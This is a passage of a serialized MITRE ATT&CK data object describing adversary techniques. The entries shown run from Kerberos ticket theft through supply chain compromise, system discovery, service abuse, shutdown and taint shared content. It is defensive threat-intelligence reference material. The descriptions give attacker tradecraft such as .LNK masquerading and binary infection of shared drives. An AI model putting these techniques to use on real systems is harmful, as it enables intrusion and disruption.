Kerberos by stealing tickets or forging tickets to enable unauthorized access.",external_references:[{source_name:b,external_id:bf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558"},{external_id:"CAPEC-652",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F652.html"},{source_name:"ADSecurity Kerberos Ring Decoder",url:"https:\u002F\u002Fadsecurity.org\u002F?p=227",description:"Sean Metcalf. (2014, September 12). Kerberos, Active Directory’s Secret Decoder Ring. Retrieved February 27, 2020."},{url:cN,description:cO,source_name:cP},{source_name:EW,url:EX,description:EY},{url:gu,description:gv,source_name:gw},{source_name:EZ,url:E_,description:E$},{url:gx,description:gy,source_name:gz},{url:gA,description:gB,source_name:gC},{description:dj,url:dk,source_name:dl}],tactics:[r],subtechniques:[Fa,Ff,Fh,Fj]},{id:ae,"object-type":a,name:"Subvert Trust Controls",description:"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1222'\u003EFile and Directory Permissions Modification\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1112'\u003EModify Registry\u003C\u002Fa\u003E in support of subverting these controls.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecterops.io\u002Fassets\u002Fresources\u002FSpecterOps_Subverting_Trust_in_Windows.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also create or steal code signing certificates to acquire trust on target systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fwhy-you-shouldnt-completely-trust-files-signed-with-digital-certificates\u002F68593\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fhow-attackers-steal-private-keys-digital-certificates'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ",external_references:[{source_name:b,external_id:ae,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553"},{url:Fl,description:Fm,source_name:Fn},{url:Fo,description:Fp,source_name:Fq},{url:Fr,description:Fs,source_name:Ft},{url:Fu,description:Fv,source_name:Fw}],tactics:[d],subtechniques:[Fx,Fz,FB,FD,FI,FK]},{id:bU,"object-type":a,name:"Supply Chain Compromise",description:"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update\u002Fdistribution mechanisms\n* Compromised\u002Finfected system images (multiple cases of removable media infected at the factory) \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww-01.ibm.com\u002Fsupport\u002Fdocview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.se.com\u002Fww\u002Fen\u002Fdownload\u002Fdocument\u002FSESN-2018-236-01\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n* Replacement of legitimate software with modified versions\n* Sales of modified\u002Fcounterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.avast.com\u002Fnew-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloudblogs.microsoft.com\u002Fmicrosoftsecure\u002F2018\u002F03\u002F07\u002Fbehavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.commandfive.com\u002Fpapers\u002FC5_APT_SKHack.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Targeting may be specific to a desired victim set \u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20190717233006\u002Fhttp:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fen\u002Fus\u002Fenterprise\u002Fmedia\u002Fsecurity_response\u002Fwhitepapers\u002Fthe-elderwood-project.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.avast.com\u002Fnew-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.commandfive.com\u002Fpapers\u002FC5_APT_SKHack.pdf'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fdk\u002Fsecurity\u002Fnews\u002Fcybercrime-and-digital-threats\u002Fhacker-infects-node-js-package-to-steal-from-bitcoin-wallets'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:bU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195"},{external_id:"CAPEC-437",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F437.html"},{external_id:"CAPEC-438",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F438.html"},{external_id:"CAPEC-439",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F439.html"},{source_name:"IBM Storwize",url:"https:\u002F\u002Fwww-01.ibm.com\u002Fsupport\u002Fdocview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E",description:"IBM Support. (2017, April 26). Storwize USB Initialization Tool may contain malicious code. Retrieved May 28, 2019."},{source_name:"Schneider Electric USB Malware",url:"https:\u002F\u002Fwww.se.com\u002Fww\u002Fen\u002Fdownload\u002Fdocument\u002FSESN-2018-236-01\u002F",description:"Schneider Electric. (2018, August 24). Security Notification – USB Removable Media Provided With Conext Combox and Conext Battery Monitor. Retrieved May 28, 2019."},{url:FM,description:FN,source_name:FO},{url:"https:\u002F\u002Fcloudblogs.microsoft.com\u002Fmicrosoftsecure\u002F2018\u002F03\u002F07\u002Fbehavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign\u002F",description:"Windows Defender Research. (2018, March 7). Behavior monitoring combined with machine learning spoils a massive Dofoil coin mining campaign. Retrieved March 20, 2018.",source_name:"Microsoft Dofoil 2018"},{url:FP,description:FQ,source_name:FR},{url:"https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20190717233006\u002Fhttp:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fen\u002Fus\u002Fenterprise\u002Fmedia\u002Fsecurity_response\u002Fwhitepapers\u002Fthe-elderwood-project.pdf",description:"O'Gorman, G., and McDonald, G.. (2012, September 6). The Elderwood Project. Retrieved February 15, 2018.",source_name:"Symantec Elderwood Sept 2012"},{source_name:FS,url:FT,description:FU}],tactics:[q],subtechniques:[FV,FX,FZ]},{id:F$,"object-type":a,name:"System Information Discovery",description:"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1082'\u003ESystem Information Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nTools such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0096'\u003ESysteminfo\u003C\u002Fa\u003E can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS \u003Ccode\u003Esystemsetup\u003C\u002Fcode\u003E command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fssm\u002Fdescribe-instance-information.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fcompute\u002Fdocs\u002Freference\u002Frest\u002Fv1\u002Finstances'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Frest\u002Fapi\u002Fcompute\u002Fvirtualmachines\u002Fget'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:F$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1082"},{external_id:"CAPEC-312",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F312.html"},{source_name:lM,url:lN,description:lO},{source_name:"Google Instances Resource",url:"https:\u002F\u002Fcloud.google.com\u002Fcompute\u002Fdocs\u002Freference\u002Frest\u002Fv1\u002Finstances",description:"Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020."},{description:"Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Frest\u002Fapi\u002Fcompute\u002Fvirtualmachines\u002Fget",source_name:"Microsoft Virutal Machine API"}],tactics:[i]},{id:Ga,"object-type":a,name:"System Location Discovery",description:"\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1614'\u003ESystem Location Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and\u002For language settings.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fassets.documentcloud.org\u002Fdocuments\u002F20413525\u002Ffbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2016\u002F05\u002F03\u002Flocation-based-ransomware-threat-research\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fnew-rat-malware-gets-commands-via-discord-has-ransomware-feature\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Windows API functions such as \u003Ccode\u003EGetLocaleInfoW\u003C\u002Fcode\u003E can also be used to determine the locale of the host.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fassets.documentcloud.org\u002Fdocuments\u002F20413525\u002Ffbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FUserGuide\u002Finstance-identity-documents.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fvirtual-machines\u002Fwindows\u002Finstance-metadata-service?tabs=windows'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Ftransparent-tribe-part-1\u002F98127\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2016\u002F05\u002F03\u002Flocation-based-ransomware-threat-research\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Ga,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1614"},{source_name:"FBI Ragnar Locker 2020",url:"https:\u002F\u002Fassets.documentcloud.org\u002Fdocuments\u002F20413525\u002Ffbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf",description:"FBI. (2020, November 19). Indicators of Compromise Associated with Ragnar Locker Ransomware. Retrieved April 1, 2021."},{source_name:"Sophos Geolocation 2016",url:"https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2016\u002F05\u002F03\u002Flocation-based-ransomware-threat-research\u002F",description:"Wisniewski, C. (2016, May 3). Location-based threats: How cybercriminals target you based on where you live. Retrieved April 1, 2021."},{source_name:"Bleepingcomputer RAT malware 2020",url:"https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fnew-rat-malware-gets-commands-via-discord-has-ransomware-feature\u002F",description:"Abrams, L. (2020, October 23). New RAT malware gets commands via Discord, has ransomware feature. Retrieved April 1, 2021."},{source_name:"AWS Instance Identity Documents",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FUserGuide\u002Finstance-identity-documents.html",description:"Amazon. (n.d.). Instance identity documents. Retrieved April 2, 2021."},{source_name:"Microsoft Azure Instance Metadata 2021",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fvirtual-machines\u002Fwindows\u002Finstance-metadata-service?tabs=windows",description:"Microsoft. (2021, February 21). Azure Instance Metadata Service (Windows). Retrieved April 2, 2021."},{source_name:"Securelist Trasparent Tribe 2020",url:"https:\u002F\u002Fsecurelist.com\u002Ftransparent-tribe-part-1\u002F98127\u002F",description:"Dedola, G. (2020, August 20). Transparent Tribe: Evolution analysis, part 1. Retrieved April 1, 2021."}],tactics:[i]},{id:gD,"object-type":a,name:"System Network Configuration Discovery",description:"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0099'\u003EArp\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0100'\u003Eipconfig\u003C\u002Fa\u003E\u002F\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0101'\u003Eifconfig\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0102'\u003Enbtstat\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0103'\u003Eroute\u003C\u002Fa\u003E.\n\nAdversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1016'\u003ESystem Network Configuration Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1016",external_id:gD},{external_id:"CAPEC-309",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F309.html"}],tactics:[i],subtechniques:[Gb]},{id:Gd,"object-type":a,name:"System Network Connections Discovery",description:"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002Fvpc\u002Flatest\u002Fuserguide\u002Fwhat-is-amazon-vpc.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fvirtual-network\u002Fvirtual-networks-overview'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fvpc\u002Fdocs\u002Fvpc'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nUtilities and commands that acquire this information include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0104'\u003Enetstat\u003C\u002Fa\u003E, \"net use,\" and \"net session\" with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E. In Mac and Linux, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0104'\u003Enetstat\u003C\u002Fa\u003E and \u003Ccode\u003Elsof\u003C\u002Fcode\u003E can be used to list current connections. \u003Ccode\u003Ewho -a\u003C\u002Fcode\u003E and \u003Ccode\u003Ew\u003C\u002Fcode\u003E can be used to show which users are currently logged in, similar to \"net session\".",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1049",external_id:Gd},{source_name:"Amazon AWS VPC Guide",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Fvpc\u002Flatest\u002Fuserguide\u002Fwhat-is-amazon-vpc.html",description:"Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019."},{source_name:"Microsoft Azure Virtual Network Overview",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fvirtual-network\u002Fvirtual-networks-overview",description:"Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18). What is Azure Virtual Network?. Retrieved October 6, 2019."},{source_name:"Google VPC Overview",url:"https:\u002F\u002Fcloud.google.com\u002Fvpc\u002Fdocs\u002Fvpc",description:"Google. (2019, September 23). Virtual Private Cloud (VPC) network overview. Retrieved October 6, 2019."}],tactics:[i]},{id:Ge,"object-type":a,name:"System Owner\u002FUser Discovery",description:"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file\u002Fdirectory ownership, session information, and system logs. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1033'\u003ESystem Owner\u002FUser Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nUtilities and commands that acquire this information include \u003Ccode\u003Ewhoami\u003C\u002Fcode\u003E. In Mac and Linux, the currently logged in user can be identified with \u003Ccode\u003Ew\u003C\u002Fcode\u003E and \u003Ccode\u003Ewho\u003C\u002Fcode\u003E.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1033",external_id:Ge},{external_id:"CAPEC-577",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F577.html"}],tactics:[i]},{id:Gf,"object-type":a,name:"System Service Discovery",description:"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist \u002Fsvc\" using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0057'\u003ETasklist\u003C\u002Fa\u003E, and \"net start\" using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E, but adversaries may also use other tools as well. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1007'\u003ESystem Service Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1007",external_id:Gf},{external_id:"CAPEC-574",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F574.html"}],tactics:[i]},{id:dv,"object-type":a,name:"System Services",description:"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543'\u003ECreate or Modify System Process\u003C\u002Fa\u003E), but adversaries can also abuse services for one-time or temporary execution.",external_references:[{source_name:b,external_id:dv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569"}],tactics:[p],subtechniques:[Gg,Gi]},{id:Gk,"object-type":a,name:"System Shutdown\u002FReboot",description:"Adversaries may shutdown\u002Freboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown\u002Freboot of a machine. In some cases, these commands may also be used to initiate a shutdown\u002Freboot of a remote computer.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fshutdown'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown\u002Freboot a system after impacting it in other ways, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F002'\u003EDisk Structure Wipe\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1490'\u003EInhibit System Recovery\u003C\u002Fa\u003E, to hasten the intended effects on system availability.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F06\u002Fworldwide-ransomware-variant.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Gk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1529"},{source_name:"Microsoft Shutdown Oct 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fshutdown",description:"Microsoft. (2017, October 15). Shutdown. Retrieved October 4, 2019."},{source_name:"Talos Nyetya June 2017",url:"https:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F06\u002Fworldwide-ransomware-variant.html",description:"Chiu, A. (2016, June 27). New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide. Retrieved March 26, 2019."},{source_name:bs,url:bt,description:bu}],tactics:[j]},{id:Gl,"object-type":a,name:"System Time Discovery",description:"An adversary may gather the system time and\u002For time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fms724961.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fwindows-server-docs\u002Fidentity\u002Fad-ds\u002Fget-started\u002Fwindows-time-service\u002Fwindows-time-service-tools-and-settings'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSystem time information may be gathered in a number of ways, such as with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E on Windows by performing \u003Ccode\u003Enet time \\\\hostname\u003C\u002Fcode\u003E to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using \u003Ccode\u003Ew32tm \u002Ftz\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fwindows-server-docs\u002Fidentity\u002Fad-ds\u002Fget-started\u002Fwindows-time-service\u002Fwindows-time-service-tools-and-settings'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis information could be useful for performing other techniques, such as executing a file with a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.rsaconference.com\u002Fwritable\u002Fpresentations\u002Ffile_upload\u002Fht-209_rivner_schwartz.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, or to discover locality information based on time zone to assist in victim targeting (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1614'\u003ESystem Location Discovery\u003C\u002Fa\u003E). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date\u002Ftime.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fany.run\u002Fcybersecurity-blog\u002Ftime-bombs-malware-with-delayed-execution\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Gl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1124"},{external_id:"CAPEC-295",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F295.html"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fms724961.aspx",description:"Microsoft. (n.d.). System Time. Retrieved November 25, 2016.",source_name:"MSDN System Time"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fwindows-server-docs\u002Fidentity\u002Fad-ds\u002Fget-started\u002Fwindows-time-service\u002Fwindows-time-service-tools-and-settings",description:"Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.",source_name:"Technet Windows Time Service"},{url:"https:\u002F\u002Fwww.rsaconference.com\u002Fwritable\u002Fpresentations\u002Ffile_upload\u002Fht-209_rivner_schwartz.pdf",description:"Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved November 25, 2016.",source_name:"RSA EU12 They're Inside"},{source_name:"AnyRun TimeBomb",url:"https:\u002F\u002Fany.run\u002Fcybersecurity-blog\u002Ftime-bombs-malware-with-delayed-execution\u002F",description:"Malicious History. (2020, September 17). Time Bombs: Malware With Delayed Execution. Retrieved April 22, 2021."}],tactics:[i]},{id:Gm,"object-type":a,name:"Taint Shared Content",description:"\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F009'\u003EShortcut Modification\u003C\u002Fa\u003E of directory .LNK files that use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to look like the real directories, which are hidden through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564\u002F001'\u003EHidden Files and Directories\u003C\u002Fa\u003E. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. \u003Csup\u003E\u003Ca href='https:\u002F\u002Frewtin.blogspot.ch\u002F2017\u002F11\u002Fabusing-user-shares-for-efficient.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and 